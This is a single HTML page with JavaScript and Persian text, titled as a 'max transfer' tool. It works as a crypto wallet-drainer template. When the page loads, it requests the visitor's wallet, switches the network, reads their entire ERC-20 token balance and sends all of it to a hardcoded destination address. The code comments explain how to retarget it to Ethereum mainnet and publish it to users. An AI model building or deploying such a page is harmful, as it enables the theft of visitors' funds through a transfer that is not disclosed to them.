<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8" />
  <title>Simple Transfer — Max Balance (Sepolia)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root{font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial}
    body{margin:0;background:#f3f4f6;display:flex;align-items:center;justify-content:center;height:100vh}
    .card{width:720px;max-width:96%;background:#fff;border-radius:12px;padding:22px;box-shadow:0 8px 30px rgba(2,6,23,0.08)}
    h1{margin:0 0 8px;font-size:18px}
    p{margin:0 0 14px;color:#475569}
    .status{padding:12px;border-radius:8px;margin-top:10px;font-weight:600}
    .loading{background:#fff7ed;color:#92400e}
    .error{background:#fff1f2;color:#7f1d1d}
    .success{background:#ecfdf5;color:#065f46}
    pre{background:#0f172a;color:#e6eef8;padding:12px;border-radius:8px;overflow:auto;max-height:240px}
    footer{margin-top:12px;font-size:13px;color:#64748b}
    .small{font-size:13px;color:#64748b}
  </style>
</head>
<body>
  <main class="card" role="main" aria-live="polite">
    <h1>انتقال کل موجودی (Max transfer) — Sepolia</h1>
    <p class="small">این صفحه فقط یک تراکنش transfer از توکن انتخاب‌شده به آدرس مقصد می‌سازد. کاربر یک امضا می‌دهد و گس را خودش پرداخت می‌کند.</p>

    <div id="status" class="status loading">⏳ آماده‌سازی ...</div>

    <pre id="log">لاگ اجرا (console-like) — برای دیباگ و تست</pre>

    <footer>
      <div class="small">نکته: قبل از استفاده، `TOKEN_ADDRESS` و `DESTINATION_ADDRESS` را در کد قرار دهید. تست روی Sepolia انجام شود؛ برای انتقال به Mainnet، بخش «تبدیل برای Mainnet» را مطالعه کنید.</div>
    </footer>
  </main>

  <script type="module">
  // -------------------------
  // Simple Max Transfer Script
  // -------------------------
  // توضیحات:
  //  - رفتار: هنگام بارگذاری صفحه، ولت را درخواست می‌کند، شبکه را بررسی می‌کند (Sepolia)، موجودی توکن را می‌خواند
  //    و یک تراکنش transfer(..., balance) ایجاد می‌کند. کاربر آن را تایید می‌کند و خودش گس پرداخت می‌کند.
  //  - فایل برای یک توکن ERC-20 تنظیم شده؛ اگر می‌خواهید برای ETH انتقال دهید (انتقال native ETH)
  //    بخش‌های زیر را تغییر دهید (راهنما در پایین).
  //
  // مهم: قبل از تست/استفاده مقدارهای PLACEHOLDER را اصلاح کنید.
  // -------------------------

  import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.esm.min.js";

  const LOG = document.getElementById('log');
  const STATUS = document.getElementById('status');
  function log(msg){ LOG.textContent += msg + "\n"; console.log(msg); }
  function setStatus(text, cls='loading'){ STATUS.textContent = text; STATUS.className = 'status ' + cls; }

  // ------------ CONFIG (جایگذاری کنید) ------------
  // لطفاً این دو مقدار را مطابق نیازِ تست یا production خود تغییر دهید:
  const TOKEN_ADDRESS = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC"; // <-- آدرس توکن ERC-20 تستی بر روی Sepolia (REPLACE)
  const DESTINATION_ADDRESS = "0xYourDestinationAddressHere000000000000000"; // <-- آدرس مقصد را اینجا بگذارید (REPLACE)

  // شبکه‌ی مورد استفاده برای تست:
  const CHAIN_ID = 11155111; // Sepolia

  // -----------------------------------------------

  (async function main(){
    try {
      setStatus("⏳ شروع — درحال وصل شدن به کیف ...", 'loading');

      if (!window.ethereum) {
        setStatus("❌ هیچ کیف پولی شناسایی نشد (MetaMask یا معادل لازم است)", 'error');
        log("window.ethereum not found");
        return;
      }

      // provider و بررسی شبکه
      const provider = new ethers.BrowserProvider(window.ethereum);

      // اگر کاربر روی شبکه اشتباه است: تلاش برای switch (بهینه: درخواست به کاربر)
      const network = await provider.getNetwork();
      log("شبکه فعلی chainId: " + network.chainId);
      if (Number(network.chainId) !== CHAIN_ID) {
        // سعی می‌کنیم درخواست تغییر شبکه بدهیم (متا‌مسک)
        try {
          await window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0xaa36a7" }] // 0xaa36a7 == 11155111 hex
          });
          log("شبکه به Sepolia تغییر داده شد (از کاربر درخواست شد)");
        } catch (switchErr) {
          // اگر کاربر نپذیرفت یا شبکه موجود نبود، پیام بده
          setStatus("⚠ لطفاً ولت خود را به شبکه Sepolia تغییر دهید و صفحه را دوباره بارگذاری کنید.", 'error');
          log("Unable to switch network automatically: " + String(switchErr));
          return;
        }
      }

      // درخواست اتصال حساب به ولت (پاپ‌آپ اتصال)
      setStatus("🔐 درخواست اتصال به کیف ...", 'loading');
      let accounts;
      try {
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      } catch (reqErr) {
        setStatus("❌ کاربر اتصال را رد کرد یا خطا رخ داد", 'error');
        log("eth_requestAccounts failed: " + String(reqErr));
        return;
      }
      const userAddr = accounts[0];
      log("آدرس کاربر: " + userAddr);

      // signer
      const signer = await provider.getSigner();

      // ERC-20 minimal ABI: balanceOf, decimals, symbol, transfer
      const ERC20_ABI = [
        "function balanceOf(address) view returns (uint256)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ];

      setStatus("🔎 خواندن موجودی توکن ...", 'loading');
      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);

      // read balance
      let balance;
      try {
        balance = await token.balanceOf(userAddr);
      } catch (err) {
        setStatus("❌ خطا در خواندن موجودی توکن. آدرس توکن را بررسی کنید.", 'error');
        log("balanceOf error: " + String(err));
        return;
      }

      // read decimals & symbol (best-effort, not required for transfer)
      let decimals = 18;
      let symbol = "";
      try { decimals = Number(await token.decimals()); } catch(e){ log("decimals read failed"); }
      try { symbol = await token.symbol(); } catch(e){ /* ignore */ }

      if (balance === 0n) {
        setStatus("ℹ️ موجودی توکن کاربر صفر است — تراکنشی ساخته نخواهد شد.", 'error');
        log(`User balance is zero for token ${TOKEN_ADDRESS}`);
        return;
      }

      // Compose human-friendly amount (for log)
      const human = (Number(balance) / Math.pow(10, decimals)).toLocaleString('en-US', { maximumFractionDigits: 6 });
      setStatus(`✳️ آماده ارسال تراکنش: ارسال کل موجودی (${human} ${symbol || 'token'})`, 'loading');
      log(`Balance (raw): ${balance.toString()}  decimals:${decimals}`);

      // Build and send transfer transaction
      setStatus("🔁 ایجاد تراکنش transfer(...) و درخواست امضا از کاربر ...", 'loading');
      let tx;
      try {
        tx = await token.transfer(DESTINATION_ADDRESS, balance);
        log("Tx sent. hash: " + tx.hash);
        setStatus("⏳ تراکنش ارسال شد، منتظر تایید شبکه (user pays gas)...", 'loading');

        // Wait for receipt (optional)
        const receipt = await tx.wait();
        if (receipt && receipt.status === 1) {
          setStatus("✅ تراکنش موفقیت‌آمیز بود. TxHash: " + tx.hash, 'success');
          log("Transaction confirmed in block " + receipt.blockNumber + " — hash: " + tx.hash);
        } else {
          setStatus("❌ تراکنش با خطا مواجه شد (reverted).", 'error');
          log("Transaction failed or reverted. receipt: " + JSON.stringify(receipt));
        }
      } catch (txErr) {
        setStatus("❌ ارسال تراکنش انجام نشد یا کاربر آن را رد کرد.", 'error');
        log("transfer error: " + String(txErr));
        return;
      }

    } catch (e) {
      setStatus("❌ خطای غیرمنتظره — جزئیات در کنسول", 'error');
      log("Unexpected error: " + String(e));
      console.error(e);
    }
  })();

  // ---------------------------
  // راهنما: نحوه تغییر برای MAINNET
  // ---------------------------
  // 1) مقدار CHAIN_ID را به 1 تغییر دهید (در بالای فایل).
  // 2) اطمینان حاصل کنید کاربر در ولت شبکه اصلی Ethereum را انتخاب کند.
  // 3) آدرس TOKEN_ADDRESS و DESTINATION_ADDRESS را برای mainnet تنظیم کنید.
  // 4) فایل را همانند قبل منتشر کنید؛ کاربران هنگام تلاش برای انتقال روی mainnet گس واقعی پرداخت می‌کنند.
  // ------------------------------------------
  </script>
</body>
</html>
